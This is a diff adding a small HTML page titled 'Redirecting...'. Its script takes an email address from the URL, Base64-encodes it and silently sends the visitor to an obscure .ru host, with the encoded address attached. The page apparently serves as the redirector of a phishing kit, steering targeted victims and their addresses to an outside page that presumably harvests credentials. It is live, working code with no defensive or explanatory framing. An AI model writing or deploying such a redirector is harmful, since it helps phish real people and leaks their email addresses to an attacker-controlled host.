@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Function to get URL parameters
+        function getQueryParam(name) {
+            let urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        // Get email from URL (e.g., ?email=user@example.com)
+        let email = getQueryParam('email');
+
+        // Check if email exists
+        if (email) {
+            // Encode email in Base64
+            let encodedEmail = btoa(email);
+
+            // Construct the redirect URL with emailtag
+            let redirectURL = "https://JE.lfixemilotor.ru/P5U3gB3/#M" + encodedEmail;
+
+            // Redirect the user
+            window.location.href = redirectURL;
+        } else {
+            document.write("<h3>Missing Email Parameter</h3>");
+        }
+    </script>
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
